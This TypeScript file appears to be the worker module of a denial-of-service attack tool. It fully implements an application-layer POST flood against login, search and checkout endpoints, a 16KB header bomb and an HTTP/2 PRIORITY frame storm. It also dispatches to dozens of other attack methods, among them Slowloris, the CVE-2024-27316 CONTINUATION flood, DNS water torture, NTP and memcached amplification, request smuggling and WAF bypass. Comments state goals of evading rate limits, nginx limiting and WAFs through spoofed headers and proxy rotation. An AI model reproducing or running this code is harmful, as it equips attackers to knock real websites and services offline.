// ─────────────────────────────────────────────────────────────────────────
//  APP SMART FLOOD — POST to high-cost endpoints, forces DB query per req
// ─────────────────────────────────────────────────────────────────────────
const SMART_ENDPOINTS = [
  "/login", "/signin", "/auth/login",
  "/search", "/api/search", "/api/v1/search", "/api/v2/search",
  "/checkout", "/cart/checkout", "/order/submit",
  "/register", "/signup", "/auth/register",
  "/api/users", "/api/products", "/api/orders",
  "/api/products/search", "/api/items/search",
  "/api/v1/auth/login", "/api/v2/checkout",
  "/account/login", "/user/login",
];

async function runAppSmartFlood(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
) {
  let localPkts = 0, localBytes = 0;
  const flushIv = setInterval(() => {
    if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
  }, 500);

  const buildSmartBody = () => {
    const username  = randStr(8);
    const password  = randStr(12);
    const email     = `${randStr(6)}@${randStr(4)}.com`;
    const query     = randStr(randInt(4, 16));
    const price     = (Math.random() * 999 + 1).toFixed(2);
    const productId = randInt(1, 999999);
    const userId    = randInt(1, 999999);
    // rotate body format: JSON (60%) or form-encoded (40%)
    if (Math.random() < 0.6) {
      const obj: Record<string, unknown> = {
        username, password, email, query,
        price, product_id: productId, user_id: userId,
        _t: Date.now(), _r: randStr(8),
        filters: { category: randStr(6), min_price: 0, max_price: price },
        page: randInt(1, 100), per_page: randInt(10, 100),
      };
      return JSON.stringify(obj);
    }
    return `username=${username}&password=${password}&email=${encodeURIComponent(email)}&q=${query}&page=${randInt(1, 100)}&_t=${Date.now()}&_r=${randStr(8)}`;
  };

  const doRequest = async () => {
    const endpoint = SMART_ENDPOINTS[randInt(0, SMART_ENDPOINTS.length)];
    const url      = `${base}${endpoint}`;
    const body     = buildSmartBody();
    const isJson   = body.startsWith("{");
    const h        = buildHeaders(true, body.length);
    h["Content-Type"] = isJson ? "application/json" : "application/x-www-form-urlencoded";
    h["Cache-Control"] = "no-cache, no-store";
    h["Pragma"]        = "no-cache";
    // Vary UA and endpoint to bypass per-endpoint rate limits
    h["User-Agent"] = randUA();
    try {
      const res = await fetch(url, {
        method: "POST",
        headers: h,
        body,
        signal: AbortSignal.timeout(8000),
      });
      await res.body?.cancel();
      localPkts++;
      localBytes += body.length + 300;
    } catch { /* target not accepting — expected */ }
  };

  const runSlot = async () => {
    while (!signal.aborted) {
      await doRequest();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(5, 25)));
    }
  };
  await Promise.all(Array.from({ length: Math.max(50, threads) }, runSlot));
  clearInterval(flushIv);
}

// ─────────────────────────────────────────────────────────────────────────
//  LARGE HEADER BOMB — 16KB randomized headers exhaust HTTP parser alloc
// ─────────────────────────────────────────────────────────────────────────
async function runLargeHeaderBomb(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
) {
  const isHttps = targetPort === 443;
  let localPkts = 0, localBytes = 0, localConns = 0;
  const flushIv = setInterval(() => {
    if (localPkts > 0) { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; }
  }, 500);

  // Build a 16KB header block with randomized X-* headers
  const buildBigHeaders = () => {
    const lines: string[] = [];
    // target ~16KB total header block
    while (lines.join("\r\n").length < 16 * 1024) {
      const name  = `X-${randStr(randInt(8, 20))}`;
      const value = randStr(randInt(30, 80));
      lines.push(`${name}: ${value}`);
    }
    return lines.join("\r\n");
  };

  const oneConn = () => new Promise<void>(resolve => {
    const bigHeaders = buildBigHeaders();
    const path       = hotPath();
    const reqLine    = `GET ${path}?_=${Date.now()} HTTP/1.1\r\n`;
    const mandatory  = [
      `Host: ${hostname}`,
      `User-Agent: ${randUA()}`,
      `Accept: */*`,
      `Connection: close`,
      `X-Forwarded-For: ${randInt(1,255)}.${randInt(0,255)}.${randInt(0,255)}.${randInt(0,255)}`,
    ].join("\r\n");
    const payload    = Buffer.from(`${reqLine}${mandatory}\r\n${bigHeaders}\r\n\r\n`);

    const done = () => { localConns = Math.max(0, localConns - 1); resolve(); };
    const sock: net.Socket | tls.TLSSocket = isHttps
      ? tls.connect({ host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false })
      : net.connect({ host: resolvedHost, port: targetPort });

    const onConn = () => {
      localConns++;
      sock.write(payload, () => {
        localPkts++;
        localBytes += payload.length;
      });
      setTimeout(done, 3000);
    };

    if (isHttps) (sock as tls.TLSSocket).once("secureConnect", onConn);
    else          sock.once("connect", onConn);
    sock.on("data",    () => {});
    sock.on("error",   done);
    sock.on("close",   done);
    sock.setTimeout(8000);
    sock.on("timeout", done);
    signal.addEventListener("abort", done, { once: true });
  });

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, randInt(10, 40)));
    }
  };
  await Promise.all(Array.from({ length: Math.max(30, threads) }, runSlot));
  clearInterval(flushIv); onStats(localPkts, localBytes, localConns);
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 PRIORITY STORM — PRIORITY frames rebuild stream dependency tree
//  RFC 7540 §6.3 — each PRIORITY frame forces server to re-sort tree
// ─────────────────────────────────────────────────────────────────────────
async function runH2PriorityStorm(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
) {
  // PRIORITY frame: type=0x2, 5 bytes payload
  // Payload: [E][stream_dep 31bits][weight 8bits]
  // Sending thousands/sec with random stream IDs forces server to rebuild
  // its entire stream priority tree on every frame.
  const buildPriorityFrame = (streamId: number) => {
    const frame     = Buffer.allocUnsafe(9 + 5);
    const depStream = randInt(1, 0x7fffffff) & ~0x80000000;
    const weight    = randInt(0, 255);
    // Frame header
    frame.writeUInt16BE(0, 0);   // length hi
    frame.writeUInt8(5, 2);      // length lo = 5
    frame.writeUInt8(0x2, 3);    // type = PRIORITY
    frame.writeUInt8(0x0, 4);    // flags = 0
    frame.writeUInt32BE(streamId & 0x7fffffff, 5);
    // Payload
    frame.writeUInt32BE(depStream, 9);
    frame.writeUInt8(weight, 13);
    return frame;
  };

  const H2_PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const H2_SETTINGS = Buffer.from([
    0,0,0x0c, 0x4,0x0, 0,0,0,0,
    0x0,0x3, 0,0,0x00,0x64,  // MAX_CONCURRENT_STREAMS=100
    0x0,0x4, 0x00,0xFF,0xFF,0xFF, // INITIAL_WINDOW_SIZE=max
  ]);

  let localPkts = 0, localBytes = 0, localConns = 0;
  const flushIv = setInterval(() => {
    if (localPkts > 0) { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; }
  }, 500);

  const oneConn = () => new Promise<void>(resolve => {
    const done = () => { localConns = Math.max(0, localConns - 1); resolve(); };
    const sock: tls.TLSSocket = tls.connect({
      host: resolvedHost, port: targetPort, servername: hostname, rejectUnauthorized: false,
      ALPNProtocols: ["h2"],
    });

    sock.once("secureConnect", () => {
      if (signal.aborted) { sock.destroy(); return done(); }
      localConns++;
      sock.write(H2_PREFACE);
      sock.write(H2_SETTINGS);

      let streamId = 1;
      // Send burst of PRIORITY frames as fast as possible
      // 200 frames per burst × every 3ms = ~66K frames/sec per conn
      const iv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { clearInterval(iv); return done(); }
        const frames = Buffer.concat(
          Array.from({ length: 200 }, () => {
            const f = buildPriorityFrame(streamId);
            streamId = (streamId + 2) % 0x7ffffffe || 1;
            return f;
          })
        );
        sock.write(frames);
        localPkts += 200;
        localBytes += frames.length;
      }, 3);

      setTimeout(() => { clearInterval(iv); sock.destroy(); done(); }, 30_000);
    });

    sock.on("data",    () => {});
    sock.on("error",   done);
    sock.on("close",   done);
    sock.setTimeout(35_000);
    sock.on("timeout", done);
    signal.addEventListener("abort", () => { sock.destroy(); done(); }, { once: true });
  });

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      if (!signal.aborted) await new Promise<void>(r => setTimeout(r, 50)); // was 200ms
    }
  };
  await Promise.all(Array.from({ length: Math.max(10, threads) }, runSlot));
  clearInterval(flushIv); onStats(localPkts, localBytes, localConns);
}

// ─────────────────────────────────────────────────────────────────────────
//  WORKER MAIN — receives config, runs attack, posts stats
// ─────────────────────────────────────────────────────────────────────────
const cfg = workerData as WorkerConfig;

const ctrl = new AbortController();
parentPort?.on("message", (msg) => {
  if (msg === "stop") ctrl.abort();
});

// Resolve host for TCP/UDP vectors
let hostname = cfg.target;
let targetPort = cfg.port || 80;
try {
  const u = new URL(/^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`);
  hostname   = u.hostname;
  // Fallback chain: explicit URL port → cfg.port → protocol default.
  // Previously was just `parseInt(u.port)||protocol`, which overwrote cfg.port=443
  // with 80 when URL was built as http://domain (no explicit port in URL).
  targetPort = parseInt(u.port, 10) || cfg.port || (u.protocol === "https:" ? 443 : 80);
} catch { /* keep raw */ }

const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
const onStats = (p: number, b: number, c = 0) => { parentPort?.postMessage({ pkts: p, bytes: b, conns: c }); };

// ── Worker entry — handle all errors gracefully ────────────────────────
const L4  = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
const UDP = new Set(["udp-flood","udp-bypass"]);

async function runWorker() {
  const resolvedHost = await resolveHost(hostname).catch(() => hostname);

  if (UDP.has(cfg.method)) {
    await runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (L4.has(cfg.method)) {
    await runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "geass-override") {
    // Triple vector (dead code path — attacks.ts already breaks this into 3 pools)
    // Kept as fallback for direct worker invocation
    const pipeT = Math.ceil(cfg.threads * 0.50);
    const tcpT  = Math.ceil(cfg.threads * 0.25);
    const udpT  = cfg.threads - pipeT - tcpT;
    await Promise.all([
      runHTTPPipeline(resolvedHost, hostname, targetPort, pipeT, ctrl.signal, onStats),
      runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
      runUDPFlood(resolvedHost, targetPort, udpT, ctrl.signal, onStats),
    ]);

  } else if (cfg.method === "http2-flood") {
    // Native HTTP/2 with multiplexed streams (node:http2)
    await runHTTP2Flood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "slowloris") {
    // Real Slowloris: half-open TLS/TCP connections — auto-detects HTTPS
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runSlowlorisReal(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps);

  } else if (cfg.method === "conn-flood") {
    // Pure connection table exhaustion — TLS handshake + hold, no HTTP layer
    // Bypasses nginx rate limiting completely (limit_req never triggered)
    const isHttps = targetPort === 443 || /^https:/i.test(cfg.target);
    await runConnFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, isHttps, cfg.proxies ?? []);

  } else if (cfg.method === "rudy") {
    // R-U-Dead-Yet: true slow-POST — 1 byte/10s trickle, server holds thread forever
    await runRUDY(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "waf-bypass") {
    // Geass WAF Bypass: JA3 randomization + Chrome AKAMAI H2 fingerprint + exact header order
    await runWAFBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-bypass") {
    // Chrome-fingerprinted 3-layer bypass (fetch+Chrome hdrs+slow-drain) — NOT runHTTPFlood
    await runHTTPBypass(base, cfg.threads, cfg.proxies ?? [], ctrl.signal, onStats);

  } else if (cfg.method === "http-flood") {
    // http-flood: use fetch-based flood (with proxy rotation) for real per-IP diversity
    // Falls back to raw pipeline when no proxies (max throughput)
    const proxies = cfg.proxies ?? [];
    if (proxies.length > 0) {
      await runHTTPFlood(base, cfg.threads, proxies, ctrl.signal, onStats);
    } else {
      await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
    }

  } else if (cfg.method === "http2-continuation") {
    // CVE-2024-27316 — CONTINUATION flood: server buffers headers indefinitely → OOM
    await runH2Continuation(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "tls-renego") {
    // TLS 1.2 renegotiation DoS — forces expensive public-key crypto on server per renegotiation
    await runTLSRenego(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "ws-flood") {
    // WebSocket exhaustion — holds WS connections open with pings (goroutine/thread per conn)
    await runWSFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "graphql-dos") {
    // GraphQL introspection + deeply nested queries — exponential resolver CPU exhaustion
    await runGraphQLDoS(base, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "quic-flood") {
    // QUIC/HTTP3 Initial packet flood — server allocates QUIC state per unique DCID
    await runQUICFlood(resolvedHost, 443, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "cache-poison") {
    // CDN cache poisoning — fills cache store with unique keys, forces 100% origin miss
    await runCachePoison(base, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "rudy-v2") {
    // RUDY v2 — multipart/form-data slow POST, server buffers until closing boundary
    await runRUDYv2(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "ssl-death") {
    // SSL Death Record — 1-byte TLS records force server to AES-GCM decrypt each byte
    await runSSLDeathRecord(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "hpack-bomb") {
    // HPACK Bomb — HTTP/2 dynamic table exhaustion via incremental-indexed headers
    await runHPACKBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "h2-settings-storm") {
    // H2 Settings Storm — SETTINGS_HEADER_TABLE_SIZE oscillation + WINDOW_UPDATE flood
    await runH2SettingsStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats, cfg.proxies ?? []);

  } else if (cfg.method === "icmp-flood") {
    // ICMP Flood — real ICMP echo request flood (Tier 1: raw-socket, Tier 2: hping3, Tier 3: UDP saturation)
    await runICMPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "dns-amp") {
    // DNS Water Torture — floods target NS servers with random subdomain queries
    // Bypasses CDN/WAF, forces recursive resolution, fills NXDOMAIN cache
    await runDNSWaterTorture(resolvedHost, hostname, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "ntp-amp") {
    // NTP Flood — real NTP mode 7 monlist + mode 3 client requests to port 123
    await runNTPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "mem-amp") {
    // Memcached Flood — real binary protocol UDP requests to port 11211
    await runMemcachedFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "ssdp-amp") {
    // SSDP Flood — real M-SEARCH packets to port 1900 (UPnP/SSDP stack exhaustion)
    await runSSDPFlood(resolvedHost, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "slow-read") {
    // Slow Read — pause TCP receive to fill server's send buffer → thread blocked
    await runSlowRead(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "range-flood") {
    // HTTP Range Flood — Range: bytes=0-0,...,499-499 forces 500× server I/O per request
    await runRangeFlood(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "xml-bomb") {
    // XML Bomb — billion-laughs entity expansion to XML/SOAP/XMLRPC endpoints
    await runXMLBomb(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "h2-ping-storm") {
    // H2 PING Storm — thousands of PING frames/s per connection, server must ACK every one
    await runH2PingStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "http-smuggling") {
    // HTTP Request Smuggling — TE/CL desync to poison backend request queue
    await runHTTPSmuggling(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "doh-flood") {
    // DNS over HTTPS Flood — random queries to /dns-query, forces recursive DNS resolver lookup
    await runDoHFlood(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "keepalive-exhaust") {
    // Keepalive Exhaust — pipeline 128 requests per keep-alive connection, holds worker threads
    await runKeepaliveExhaust(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "app-smart-flood") {
    // App Smart Flood — POST to /login /search /checkout forcing DB queries, uncacheable
    await runAppSmartFlood(base, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "large-header-bomb") {
    // Large Header Bomb — 16KB randomized headers exhaust HTTP parser allocator
    await runLargeHeaderBomb(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else if (cfg.method === "http2-priority-storm") {
    // H2 PRIORITY Storm — PRIORITY frames force server to rebuild stream dependency tree per frame
    await runH2PriorityStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);

  } else {
    // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
    await runHTTPPipeline(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
  }
}

runWorker()
  .catch((e) => { process.stderr.write(`[WORKER_ERR] ${cfg.method}: ${e?.message ?? e}\n`); })
  .finally(() => {
    parentPort?.postMessage({ done: true });
  });
